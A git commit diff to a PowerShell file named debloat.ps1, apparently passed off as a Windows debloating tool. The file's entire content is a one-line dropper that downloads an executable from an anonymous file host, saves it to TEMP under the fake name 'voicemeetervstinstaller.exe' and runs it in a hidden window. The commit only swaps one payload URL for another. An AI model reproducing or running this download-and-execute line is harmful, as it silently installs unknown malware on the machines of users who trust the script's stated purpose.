75906617c5daf8612ca3c3c6f39248dbd78587eb
Bistoune <121984348+Bistoune@users.noreply.github.com>
2023-01-05 01:35:24 +0100

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://cdn-124.anonfiles.com/re35eeQdy7/e6a222ce-1672878804/deniz.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-148.anonfiles.com/F35ee8Q4yb/c3cc9f23-1672879470/ababa.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
